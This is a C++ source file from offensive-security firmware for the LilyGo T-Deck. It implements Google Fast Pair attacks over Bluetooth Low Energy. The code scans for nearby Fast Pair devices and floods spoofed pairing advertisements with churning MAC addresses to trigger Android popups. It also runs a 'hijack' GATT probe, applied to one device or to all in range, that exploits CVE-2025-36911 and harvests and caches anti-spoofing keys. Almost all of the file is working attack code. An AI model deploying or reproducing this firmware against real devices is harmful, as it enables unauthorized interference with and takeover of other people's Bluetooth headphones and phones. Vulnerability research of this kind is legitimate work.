// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Fast Pair attack suite — WhisperPair (CVE-2025-36911)
// GATT probe approach adapted from BruceDevices/firmware (AGPL-3.0)
// https://github.com/BruceDevices/firmware/tree/main/src/modules/ble

#include "fast_pair.h"
#include "fast_pair_keys.h"
#include "display_manager.h"
#include "input_handling.h"
#include "constants.h"

#include <NimBLEDevice.h>
#include <SD.h>
#include <mbedtls/ecp.h>
#include <mbedtls/sha256.h>
#include <mbedtls/aes.h>
#include "esp_random.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

FastPair fastPair;
bool     g_fpBtInited = false;   // kept for any legacy references; NimBLE init is idempotent

// ── SD paths ─────────────────────────────────────────────────────────────────
#define FP_SD_KEYS   "/fastpair_keys.csv"
#define FP_SD_PAIRED "/fastpair_paired.csv"
#define FP_SD_LOG    "/logs/fastpair.csv"

// ── Fast Pair GATT UUIDs ──────────────────────────────────────────────────────
static const char* FP_SVC_UUID = "0000FE2C-0000-1000-8000-00805F9B34FB";
static const char* FP_KBP_UUID = "FE2C1234-8366-4814-8EB0-01DE32100BEA";

// ── Scanned device cache ──────────────────────────────────────────────────────
struct FpScanned {
    char    addr[18];
    uint8_t addrType;
    uint32_t modelId;
    int8_t   rssi;
    char     name[32];
};
static FpScanned    s_fpScanned[32];
static volatile int s_fpCount  = 0;
static volatile bool s_scanDone = false;

// ── BLE init (idempotent via NimBLE) ─────────────────────────────────────────
static void fpBleInit() {
    NimBLEDevice::init("T-REX");
    g_fpBtInited = true;
}

// ── Crypto RNG wrapper ────────────────────────────────────────────────────────
static int fpRng(void*, unsigned char* buf, size_t len) {
    esp_fill_random(buf, len);
    return 0;
}

// ── SD helpers ────────────────────────────────────────────────────────────────
static inline void fpSdRemount() { SD.begin(39); }

void FastPair::saveLog(const char* mac, uint32_t modelId, const char* name,
                       int8_t rssi, const char* status) {
    File f = SD.open(FP_SD_LOG, FILE_APPEND);
    if (!f) return;
    char line[80];
    snprintf(line, sizeof(line), "%s,%06X,%.24s,%d,%s\n",
             mac, modelId, name ? name : "Unknown", rssi, status);
    f.print(line); f.close();
}

void FastPair::savePaired(const char* addr, const char* name) {
    File f = SD.open(FP_SD_PAIRED, FILE_APPEND);
    if (!f) return;
    f.printf("%s,%s\n", addr, name ? name : "Unknown");
    f.close();
}

bool FastPair::loadFromSD(uint32_t modelId, uint8_t* out64) {
    File f = SD.open(FP_SD_KEYS, FILE_READ);
    if (!f) return false;
    char line[160];
    while (f.available()) {
        int len = 0;
        while (f.available() && len < (int)sizeof(line) - 1) {
            char c = f.read();
            if (c == '\n') break;
            if (c != '\r') line[len++] = c;
        }
        line[len] = '\0';
        if (len < 10) continue;
        char* p1 = strchr(line, ','); if (!p1) continue; *p1 = '\0';
        char* p2 = strchr(p1 + 1, ','); if (!p2) continue; *p2 = '\0';
        uint32_t mid = (uint32_t)strtoul(line, nullptr, 16);
        if (mid != modelId) continue;
        if (strlen(p2 + 1) < 128) continue;
        // hex decode
        const char* h = p2 + 1;
        bool ok = true;
        for (int i = 0; i < 64 && ok; i++) {
            auto nib = [](char c) -> int {
                if (c >= '0' && c <= '9') return c - '0';
                if (c >= 'a' && c <= 'f') return c - 'a' + 10;
                if (c >= 'A' && c <= 'F') return c - 'A' + 10;
                return -1;
            };
            int hi = nib(h[i*2]), lo = nib(h[i*2+1]);
            if (hi < 0 || lo < 0) { ok = false; break; }
            out64[i] = (uint8_t)((hi << 4) | lo);
        }
        if (ok) { f.close(); return true; }
    }
    f.close();
    return false;
}

void FastPair::saveToSD(uint32_t modelId, const char* name, const uint8_t* key64) {
    File f = SD.open(FP_SD_KEYS, FILE_APPEND);
    if (!f) return;
    char line[160]; int pos = snprintf(line, 10, "%06X,", modelId);
    for (const char* p = name; *p && pos < 40; p++)
        if (*p != ',') line[pos++] = *p;
    line[pos++] = ',';
    for (int i = 0; i < 64; i++) {
        line[pos++] = "0123456789ABCDEF"[key64[i] >> 4];
        line[pos++] = "0123456789ABCDEF"[key64[i] & 0x0F];
    }
    line[pos++] = '\n'; line[pos] = '\0';
    f.print(line); f.close();
}

bool FastPair::lookupKey(uint32_t modelId, const char* /*name*/, uint8_t* out64) {
    return loadFromSD(modelId, out64);
}

// ── Scan display ──────────────────────────────────────────────────────────────
static void renderFpPage(int page, int perPage, int total) {
    DisplayManager& dm = displayManager;
    int tp = max(1, (total + perPage - 1) / perPage);
    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    char hdr[8]; snprintf(hdr, sizeof(hdr), "%02d/%02d", page + 1, tp);
    dm.setTextColor(0x7BEF); dm.printText("[");
    dm.setTextColor(TFT_CYAN); dm.printText("SCAN");
    dm.setTextColor(0x7BEF); dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("FP");
    dm.setTextColor(0x7BEF); dm.printText("]  ");
    dm.setTextColor(0x7BEF); dm.println(hdr);
    dm.printSeparator();
    int start = page * perPage, end = min(start + perPage, total);
    for (int i = start; i < end; i++) {
        dm.setCursor(10, dm.getCursorY());
        char idx[5]; snprintf(idx, sizeof(idx), "[%d]", i);
        dm.setTextColor(TFT_YELLOW); dm.printText(idx);
        dm.setTextColor(TFT_WHITE);
        char mac[20]; snprintf(mac, sizeof(mac), " %s", s_fpScanned[i].addr);
        dm.printText(mac);
        int r = s_fpScanned[i].rssi;
        char rs[8]; snprintf(rs, sizeof(rs), " %4d", r);
        dm.setTextColor(r >= -60 ? TFT_GREEN : (r >= -75 ? TFT_YELLOW : TFT_RED));
        dm.printText(rs);
        char nm[18]; snprintf(nm, sizeof(nm), " %.15s", s_fpScanned[i].name);
        dm.setTextColor(TFT_CYAN); dm.println(nm);
    }
    dm.printSeparator(); dm.setCursor(10, dm.getCursorY()); dm.setTextColor(0x7BEF);
    dm.println("[l/a]=page [h+#]=hijack [A]=all [s]=spam [q]=quit");
}

// ── FastPair::command() ───────────────────────────────────────────────────────
void FastPair::command(const char* args) {
    if (!args || !*args || strncmp(args, "scan", 4) == 0) { scan(); return; }
    if (strncmp(args, "spam", 4) == 0)                    { spam(); return; }
    const char* p = args;
    if (strncmp(p, "hijack", 6) == 0) p += 6;
    else if (*p == 'h')               p += 1;
    while (*p == ' ') p++;
    if (strcmp(p, "all") == 0)  { hijackAll(); return; }
    if (*p >= '0' && *p <= '9') { hijack(atoi(p)); return; }
    displayManager.setTextColor(TFT_YELLOW);
    displayManager.println("Usage: fp [scan|spam|h <idx>|h all]");
    displayManager.printCommandScreen();
}

// ── FastPair::scan() ──────────────────────────────────────────────────────────
// NimBLE v2.x: start() is non-blocking — returns immediately and fires callbacks
// from the BLE host task.  Drive the timeout with millis() on the main task.

class FpScanCb : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (s_fpCount >= 32) return;
        if (!dev->haveServiceData()) return;
        std::string sd = dev->getServiceData(NimBLEUUID("FE2C"));
        if (sd.length() < 3) return;
        std::string addr = dev->getAddress().toString();
        for (int j = 0; j < s_fpCount; j++)
            if (strcmp(s_fpScanned[j].addr, addr.c_str()) == 0) return;
        uint32_t mid = ((uint8_t)sd[0] << 16) | ((uint8_t)sd[1] << 8) | (uint8_t)sd[2];
        int idx = s_fpCount++;
        strncpy(s_fpScanned[idx].addr, addr.c_str(), 17);
        s_fpScanned[idx].addr[17]   = '\0';
        s_fpScanned[idx].addrType   = (uint8_t)dev->getAddressType();
        s_fpScanned[idx].modelId    = mid;
        s_fpScanned[idx].rssi       = dev->getRSSI();
        const char* nm = fpLookupName(mid);
        if (nm) strncpy(s_fpScanned[idx].name, nm, 31);
        else    snprintf(s_fpScanned[idx].name, 32, "%06X", mid);
        s_fpScanned[idx].name[31]   = '\0';
    }
};

void FastPair::scan() {
    DisplayManager& dm = displayManager;

    NimBLEDevice::init("");
    s_fpCount = 0; s_scanDone = false;

    static FpScanCb cb;
    NimBLEScan* pScan = NimBLEDevice::getScan();
    pScan->setScanCallbacks(&cb, false);
    pScan->setActiveScan(true);
    pScan->setInterval(100); pScan->setWindow(99);
    pScan->clearResults();

    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    dm.setTextColor(0x7BEF); dm.printText("[");
    dm.setTextColor(TFT_CYAN); dm.printText("SCAN");
    dm.setTextColor(0x7BEF); dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("FP");
    dm.setTextColor(0x7BEF); dm.println("]");
    dm.printSeparator();

    // NimBLE v2.x start() is non-blocking — drive timeout with millis()
    pScan->start(0);   // 0 = continuous; we call stop() after SCAN_MS

    const uint32_t SCAN_MS = 5000;
    const char spinner[] = "|/-\\";
    uint32_t frame = 0, t0 = millis();
    bool aborted = false;

    while (millis() - t0 < SCAN_MS) {
        uint32_t elapsed = (millis() - t0) / 1000;
        char buf[48];
        snprintf(buf, sizeof(buf), "Scanning FP... %c  %lus  found:%d",
                 spinner[frame++ % 4], (unsigned long)elapsed, (int)s_fpCount);
        dm.fillRect(10, outputY + LINE_HEIGHT, SCREEN_WIDTH - 10, LINE_HEIGHT, TFT_BLACK);
        dm.setCursor(10, outputY + LINE_HEIGHT); dm.setTextColor(TFT_CYAN);
        dm.printText(buf);
        vTaskDelay(pdMS_TO_TICKS(100));
        if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
    }

    pScan->stop();
    pScan->setScanCallbacks(nullptr);
    pScan->clearResults();

    if (aborted) { dm.printCommandScreen(); return; }

    if (s_fpCount == 0) {
        dm.clearScreen(); dm.setCursor(10, outputY);
        dm.setTextColor(TFT_YELLOW); dm.println("No Fast Pair devices found.");
        dm.printCommandScreen(); return;
    }

    for (int i = 0; i < (int)s_fpCount; i++)
        saveLog(s_fpScanned[i].addr, s_fpScanned[i].modelId,
                s_fpScanned[i].name, s_fpScanned[i].rssi, "found");

    const int perPage = 10; int page = 0;
    while (true) {
        renderFpPage(page, perPage, (int)s_fpCount);
        // Capture cursor Y immediately after render — before any status-bar
        // update can move the TFT cursor to y<30 and corrupt getCursorY().
        int32_t promptY = dm.getCursorY();
        if (promptY < outputY) promptY = SCREEN_HEIGHT - LINE_HEIGHT * 2;
        int tp = max(1, ((int)s_fpCount + perPage - 1) / perPage);
        while (true) {
            char k = inputHandler.getKeyboardInput();
            if ((k == 'l' || k == 'L') && page < tp - 1) { page++; break; }
            if ((k == 'a' || k == 'A') && page > 0)       { page--; break; }
            if (k == 's' || k == 'S') { spam(); return; }
            if (k == 'A') { hijackAll(); return; }
            if (k == 'h' || k == 'H') {
                dm.fillRect(0, promptY, SCREEN_WIDTH, LINE_HEIGHT + 2, TFT_BLACK);
                dm.setCursor(10, promptY);
                dm.setTextColor(TFT_CYAN); dm.printText("Hijack #: ");
                uint32_t t = millis(); int idx = -1;
                while (millis() - t < 5000) {
                    char k2 = inputHandler.getKeyboardInput();
                    if (k2 >= '0' && k2 <= '9') { idx = k2 - '0'; break; }
                }
                if (idx >= 0 && idx < (int)s_fpCount) { hijack(idx); return; }
                break;
            }
            if (k == 'q' || k == 'Q') { dm.printCommandScreen(); return; }
        }
    }
}

// ── FastPair::spam() — Google Fast Pair advertisement flood ───────────────────
// Advertisement format from BruceDevices/firmware ble_spam.cpp (AGPL-3.0)
// https://github.com/BruceDevices/firmware
void FastPair::spam() {
    DisplayManager& dm = displayManager;
    NimBLEDevice::init("");   // idempotent — loop does per-cycle deinit+init for MAC churn

    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    dm.setTextColor(0x7BEF); dm.printText("[");
    dm.setTextColor(TFT_CYAN); dm.printText("SPAM");
    dm.setTextColor(0x7BEF); dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("FP");
    dm.setTextColor(0x7BEF); dm.println("]");
    dm.printSeparator();

    int i = 0;
    while (true) {
        uint32_t    mid = FP_KNOWN_DEVICES[i % FP_KNOWN_COUNT].modelId;
        const char* n   = FP_KNOWN_DEVICES[i % FP_KNOWN_COUNT].name;

        // New random MAC every cycle — Android deduplicates by MAC+modelId pair
        NimBLEDevice::deinit(true);
        vTaskDelay(pdMS_TO_TICKS(20));
        NimBLEDevice::init("");

        NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
        NimBLEAdvertisementData advData;
        advData.setFlags(0x06);

        // Exact BruceDevices format: UUID list + service data only (no TX power)
        std::string uuidAd; uuidAd += (char)0x03; uuidAd += (char)0x03;
                            uuidAd += (char)0x2C; uuidAd += (char)0xFE;
        advData.addData((const uint8_t*)uuidAd.data(), uuidAd.size());

        std::string sdAd; sdAd += (char)0x06; sdAd += (char)0x16;
                          sdAd += (char)0x2C; sdAd += (char)0xFE;
                          sdAd += (char)(mid >> 16);
                          sdAd += (char)(mid >> 8);
                          sdAd += (char)(mid & 0xFF);
        advData.addData((const uint8_t*)sdAd.data(), sdAd.size());

        pAdv->setAdvertisementData(advData);
        pAdv->setMinInterval(32); pAdv->setMaxInterval(48);
        pAdv->start();  // NimBLE stops previous adv automatically

        dm.fillRect(10, outputY + LINE_HEIGHT, SCREEN_WIDTH - 10, LINE_HEIGHT * 3, TFT_BLACK);
        dm.setCursor(10, outputY + LINE_HEIGHT); dm.setTextColor(TFT_WHITE);
        char buf[40]; snprintf(buf, sizeof(buf), "Model: %06X", mid); dm.println(buf);
        dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
        snprintf(buf, sizeof(buf), "%.28s", n); dm.println(buf);
        dm.setCursor(10, dm.getCursorY()); dm.setTextColor(0x7BEF); dm.println("[q]=stop");

        uint32_t t = millis(); bool done = false;
        while (millis() - t < 10000) {  // 10s — Android needs time to show FP popup
            if (inputHandler.getKeyboardInput() == 'q') { done = true; break; }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        pAdv->stop();
        if (done) break;
        i++;
    }
    // Teardown — do NOT reinit; next BLE command inits from clean state
    NimBLEDevice::deinit(true);
    vTaskDelay(pdMS_TO_TICKS(100));
    fpSdRemount(); dm.printCommandScreen();
}

// ── GATT attack (WhisperPair probe — BruceDevices approach) ──────────────────
bool FastPair::doGattAttack(const char* bdaStr, uint8_t addrType,
                             uint32_t modelId, const char* name) {
    DisplayManager& dm = displayManager;
    fpBleInit();

    NimBLEAddress addr(bdaStr, addrType);
    NimBLEClient* pClient = NimBLEDevice::createClient();
    pClient->setConnectionParams(6, 6, 0, 42);

    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
    dm.println("Connecting via GATT...");
    if (!pClient->connect(addr)) {
        dm.setTextColor(TFT_RED); dm.println("Connect failed.");
        NimBLEDevice::deleteClient(pClient);
        fpSdRemount(); dm.printCommandScreen(); return false;
    }
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_GREEN); dm.println("Connected!");

    NimBLERemoteService* pSvc = pClient->getService(FP_SVC_UUID);
    if (!pSvc) {
        dm.setTextColor(TFT_RED); dm.println("FP service not found.");
        pClient->disconnect(); NimBLEDevice::deleteClient(pClient);
        fpSdRemount(); dm.printCommandScreen(); return false;
    }

    NimBLERemoteCharacteristic* pKBP = pSvc->getCharacteristic(FP_KBP_UUID);
    if (!pKBP) {
        dm.setTextColor(TFT_RED); dm.println("KBP char not found.");
        pClient->disconnect(); NimBLEDevice::deleteClient(pClient);
        fpSdRemount(); dm.printCommandScreen(); return false;
    }

    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
    dm.println("Discovering services...");

    // Subscribe for notifications
    volatile bool notifReady = false;
    volatile uint8_t notifBuf[80] = {}; volatile size_t notifLen = 0;
    if (pKBP->canNotify()) {
        pKBP->subscribe(true,
            [&](NimBLERemoteCharacteristic*, uint8_t* d, size_t l, bool) {
                size_t cl = l < 80 ? l : 80;
                memcpy((void*)notifBuf, d, cl);
                notifLen  = cl;
                notifReady = true;
            });
    }

    // Step 1: Try reading the public key directly (device in pairing mode exposes it)
    uint8_t pubKey64[64] = {}; bool hasKey = false;
    if (pKBP->canRead()) {
        dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
        dm.println("Reading anti-spoofing key...");
        std::string val = pKBP->readValue();
        if (val.length() == 64) {
            memcpy(pubKey64, val.data(), 64);
            hasKey = true;
            saveToSD(modelId, name, pubKey64);
            dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_GREEN);
            dm.println("Key read from device — cached.");
        } else if (val.length() == 65 && (uint8_t)val[0] == 0x04) {
            memcpy(pubKey64, val.data() + 1, 64);
            hasKey = true;
            saveToSD(modelId, name, pubKey64);
            dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_GREEN);
            dm.println("Key read from device — cached.");
        }
    }

    // Step 2: Try SD cache
    if (!hasKey) hasKey = loadFromSD(modelId, pubKey64);

    // Step 3: WhisperPair probe — send seeker's ephemeral public key.
    // Vulnerable devices respond with their own key (proving CVE-2025-36911).
    // Technique from BruceDevices/firmware performRealHandshake() (AGPL-3.0).
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
    dm.println("Sending WhisperPair probe...");

    mbedtls_ecp_group grp; mbedtls_mpi privD; mbedtls_ecp_point pubQ;
    mbedtls_ecp_group_init(&grp); mbedtls_mpi_init(&privD); mbedtls_ecp_point_init(&pubQ);
    mbedtls_ecp_group_load(&grp, MBEDTLS_ECP_DP_SECP256R1);
    mbedtls_ecp_gen_keypair(&grp, &privD, &pubQ, fpRng, nullptr);
    uint8_t epkX[32]={}, epkY[32]={};
    mbedtls_mpi_write_binary(&pubQ.X, epkX, 32);
    mbedtls_mpi_write_binary(&pubQ.Y, epkY, 32);
    mbedtls_ecp_point_free(&pubQ); mbedtls_mpi_free(&privD); mbedtls_ecp_group_free(&grp);

    // [type=0x00][flags=0x00][0x04 + X(32B) + Y(32B)] = 67 bytes
    uint8_t hello[67] = {}; hello[2] = 0x04;
    memcpy(&hello[3], epkX, 32); memcpy(&hello[35], epkY, 32);

    notifReady = false;
    pKBP->writeValue(hello, sizeof(hello), true);

    uint32_t t0 = millis();
    while (!notifReady && millis() - t0 < 3000) {
        if (inputHandler.getKeyboardInput() == 'q') break;
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    bool responded = notifReady;
    // If device replied with its own 65-byte key (type 0x00, 0x00, 0x04 prefix) → grab it
    if (responded && notifLen >= 67 &&
        notifBuf[0] == 0x00 && notifBuf[1] == 0x00 && notifBuf[2] == 0x04) {
        memcpy(pubKey64, (const void*)(notifBuf + 3), 64);
        hasKey = true;
        saveToSD(modelId, name, pubKey64);
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    vTaskDelay(pdMS_TO_TICKS(100));
    fpSdRemount();

    dm.printSeparator(); dm.setCursor(10, dm.getCursorY());

    if (responded) {
        saveLog(bdaStr, modelId, name, 0, "VULNERABLE");
        dm.setTextColor(TFT_RED);   dm.println("** VULNERABLE (CVE-2025-36911) **");
        dm.setCursor(10, dm.getCursorY());
        dm.setTextColor(TFT_WHITE); dm.println("Responded to KBP outside pairing mode!");
        if (hasKey) {
            dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_GREEN);
            dm.println("Anti-spoofing key obtained & cached.");
        }
        dm.printCommandScreen();
        return true;
    } else {
        saveLog(bdaStr, modelId, name, 0, "no_response");
        dm.setTextColor(TFT_GREEN); dm.println("No response — likely patched.");
        dm.printCommandScreen();
        return false;
    }
}

// ── FastPair::hijack() ────────────────────────────────────────────────────────
void FastPair::hijack(int idx) {
    DisplayManager& dm = displayManager;
    if (idx < 0 || idx >= (int)s_fpCount) {
        dm.setTextColor(TFT_RED); dm.println("No scan data. Run 'fp scan' first.");
        dm.printCommandScreen(); return;
    }
    FpScanned& dev = s_fpScanned[idx];

    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    dm.setTextColor(0x7BEF); dm.printText("[");
    dm.setTextColor(TFT_CYAN); dm.printText("ATCK");
    dm.setTextColor(0x7BEF); dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("FP");
    dm.setTextColor(0x7BEF); dm.println("]  01/01");
    dm.printSeparator();
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
    char buf[40]; snprintf(buf, sizeof(buf), "Target: %s", dev.addr); dm.println(buf);
    dm.setCursor(10, dm.getCursorY());
    snprintf(buf, sizeof(buf), "Model:  %s", dev.name); dm.println(buf);

    doGattAttack(dev.addr, dev.addrType, dev.modelId, dev.name);
}

// ── FastPair::hijackAll() ─────────────────────────────────────────────────────
void FastPair::hijackAll() {
    DisplayManager& dm = displayManager;
    if (s_fpCount == 0) {
        dm.setTextColor(TFT_RED); dm.println("No scan data. Run 'fp scan' first.");
        dm.printCommandScreen(); return;
    }

    int vulnerable = 0; bool aborted = false;

    for (int i = 0; i < (int)s_fpCount && !aborted; i++) {
        FpScanned& dev = s_fpScanned[i];

        dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
        char hdr[8]; snprintf(hdr, sizeof(hdr), "%02d/%02d", i + 1, (int)s_fpCount);
        dm.setTextColor(0x7BEF); dm.printText("[");
        dm.setTextColor(TFT_CYAN); dm.printText("ATCK");
        dm.setTextColor(0x7BEF); dm.printText("::");
        dm.setTextColor(TFT_YELLOW); dm.printText("FP");
        dm.setTextColor(0x7BEF); dm.printText("]  "); dm.println(hdr);
        dm.printSeparator();
        dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
        char buf[40];
        snprintf(buf, sizeof(buf), "Target: %s", dev.addr); dm.println(buf);
        dm.setCursor(10, dm.getCursorY());
        snprintf(buf, sizeof(buf), "Model:  %.20s", dev.name); dm.println(buf);

        if (doGattAttack(dev.addr, dev.addrType, dev.modelId, dev.name)) vulnerable++;

        if (i < (int)s_fpCount - 1) {
            uint32_t t = millis();
            while (millis() - t < 3000) {
                if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
                vTaskDelay(pdMS_TO_TICKS(50));
            }
        }
    }

    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    dm.setTextColor(0x7BEF); dm.printText("["); dm.setTextColor(TFT_CYAN); dm.printText("DONE");
    dm.setTextColor(0x7BEF); dm.printText("::"); dm.setTextColor(TFT_YELLOW); dm.printText("FP");
    dm.setTextColor(0x7BEF); dm.println("]");
    dm.printSeparator();
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
    char buf[40]; snprintf(buf, sizeof(buf), "Tested:     %d", (int)s_fpCount); dm.println(buf);
    dm.setCursor(10, dm.getCursorY());
    snprintf(buf, sizeof(buf), "Vulnerable: %d", vulnerable);
    dm.setTextColor(vulnerable > 0 ? TFT_RED : TFT_GREEN); dm.println(buf);
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(0x7BEF);
    dm.println("Log: /logs/fastpair.csv");
    dm.setCursor(10, dm.getCursorY()); dm.println("[q]=quit");

    while (inputHandler.getKeyboardInput() != 'q') vTaskDelay(pdMS_TO_TICKS(50));
    fpSdRemount(); dm.printCommandScreen();
}

// ── FastPair::listenTo() — not supported on ESP32-S3 ─────────────────────────
void FastPair::listenTo(const uint8_t* classicBda, const char* name) {
    DisplayManager& dm = displayManager;
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_YELLOW);
    dm.println("HFP audio not supported on ESP32-S3");
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(0x7BEF);
    char buf[40];
    snprintf(buf, sizeof(buf), "Classic BT addr: %02X:%02X:%02X:%02X:%02X:%02X",
             classicBda[0], classicBda[1], classicBda[2],
             classicBda[3], classicBda[4], classicBda[5]);
    dm.println(buf);
    dm.setCursor(10, dm.getCursorY()); dm.println("Saved to /fastpair_paired.csv");
    fpSdRemount(); dm.printCommandScreen();
}
